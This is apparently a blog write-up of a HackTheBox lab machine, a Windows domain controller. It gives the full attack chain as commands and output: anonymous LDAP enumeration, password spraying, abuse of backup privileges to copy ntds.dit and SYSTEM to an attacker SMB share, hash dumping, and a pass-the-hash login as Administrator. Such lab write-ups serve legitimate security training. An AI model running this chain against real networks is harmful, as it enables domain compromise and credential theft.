---
layout: post
title: HTB Baby Writeup
date: 2026-03-28 21:46 -0400
categories: [Writeups, HackTheBox]
tags: [ctf]
---

## Initial Enumeration
Let's start with our standard nmap scan
``` shell
sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
```

**Open Ports**
``` shell
nmapout:53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
nmapout:88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-18 20:23:39Z)
nmapout:135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
nmapout:139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
nmapout:389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
nmapout:445/tcp  open  microsoft-ds? syn-ack ttl 127
nmapout:464/tcp  open  kpasswd5?     syn-ack ttl 127
nmapout:593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
nmapout:636/tcp  open  tcpwrapped    syn-ack ttl 127
nmapout:3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
nmapout:3269/tcp open  tcpwrapped    syn-ack ttl 127
nmapout:3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
nmapout:5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The target appears to be Domain Controller based on the ports open.
``` shell
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name

Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We then can add this FQDN to our `/etc/hosts` file:
``` shell
echo "$TARGETIP    BABYDC.baby.vl baby.vl" | sudo tee -a /etc/hosts
```
## Service Enumeration
### LDAP enumeration
We can see if LDAP requires credentials to retrieve domain information
``` shell
ldapsearch -x -H ldap://baby.vl -b "dc=baby,dc=vl"
```

Parsing the output, we find a password set in the description of the user **Teresa Bell**
```
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
```

We now have the credentials:
```
Teresa.bell / BabyStart123!
```

## User Access
Credentials for **Teresa.Bell** don't work, so we can attempt to spray this password to other users. We will first have to establish a user list, which we can use the LDAP information returned:
``` shell
ldapsearch -x -H ldap://baby.vl -b "dc=baby,dc=vl" | grep "member:" | cut -d "=" -f 2 | cut -d "," -f 1 | tr " " "." > users.txt

Administrator
Read-only.Domain.Controllers
Group.Policy.Creator.Owners
Domain.Admins
Cert.Publishers
Enterprise.Admins
Schema.Admins
Domain.Controllers
krbtgt
Ian.Walker
Leonard.Dyer
Hugh.George
Ashley.Webb
Jacqueline.Barnett
Caroline.Robinson
Teresa.Bell
Kerry.Wilson
Joseph.Hughes
Connor.Wilkinson
```

We can then spray this password against all users.
``` shell
nxc smb $TARGETIP -u users.txt -p BabyStart123!
```


The password spraying fails against all users, but shows **Caroline.Robinson** must reset their password:
``` shell
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

We can use **smbpasswd** to reset the password
``` shell
smbpasswd -r $TARGETIP -U "baby.vl/Caroline.Robinson"
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

We reset the password to the one below
```
Caroline.Robinson / newP@ssword2022
```

With these credentials in hand, we can attempt to access the machine via WinRM:
``` shell
evil-winrm -i $TARGETIP -u Caroline.Robinson -p newP@ssword2022
```

It is successful, and we able to extract our **user.txt**:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls ..\Desktop


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/31/2026   6:22 PM             34 user.txt
```
## Privilege Escalation

Looking at our privileges as the **Caroline.Robinson** user, it is observed that the user is part of the **BackupOperators** group:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /groups
                                                                                                                                                                                                                                                                                                                            
GROUP INFORMATION                                                                                                                                                                                                                                                                                                           
-----------------                                                                                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                                                                                                            
Group Name                                 Type             SID                                            Attributes                                                                                                                                                                                                       
========================================== ================ ============================================== ==================================================                                                                                                                                                               
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group                                                                                                                                                               
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

We can also verify our privileges:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv
                                                                                                                                                                                                                                                                                                                            
PRIVILEGES INFORMATION                                                                                                                                                                                                                                                                                                      
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This can be exploited with the **SeBackupPrivilege** to copy the SYSTEM and NTDS files. We can use the tools found [here](https://github.com/giuliano108/SeBackupPrivilege), and download them to our linux machine:
``` shell
git clone https://github.com/giuliano108/SeBackupPrivilege
```

Specifically, we will be leveraging the two DLLs below. We can upload these to our victim machine with evil-winrm:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload /home/kali/Documents/tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload /home/kali/Documents/tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```

We then import them into our current powershell session to be used later on:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

We will create a dsh script to create a Z: mount, and the diskshadow utility to allow access to these files. Since they are being used by the system, we can not just directly access them, nor do we have the permissions.
``` shell
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

We will save this file as vss.dsh, and convert it to DOS format since we are working off linux.
``` shell
unix2dos vss.dsh
```

We can upload the file to the machine, and then run the following command:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload vss.dsh
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> C:\Windows\System32\diskshadow /s vss.dsh
```

Then, we will start SMB server on kali to facilitate the transfer:
``` shell
sudo impacket-smbserver -smb2support share $(pwd) -user user -pass pass
```

We can connect to the share with the following:
``` shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> net use \\10.10.14.8\share /user:user pass
```

We can now transfer over the NTDS + SYSTEM files using the Copy-FileSeBackupPrivilege
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.8\share\ntds.dit
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> Copy-FileSeBackupPrivilege z:\Windows\System32\config\SYSTEM \\10.10.14.8\share\system.save
```

With the files on our linux machine, we can use impacket-secretsdump to extract the hashes available:
``` shell
sudo impacket-secretsdump -system system.save -ntds ntds.dit LOCAL
[sudo] password for kali: 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

Using the extracted hash , we can then initiate a WinRM session with the Administrator user by passing the hash, without having to crack it:
```
evil-winrm -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d' -i $TARGETIP
```

We can now extract the **root.txt** from the desktop folder:
``` shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/31/2026   6:22 PM             34 root.txt
```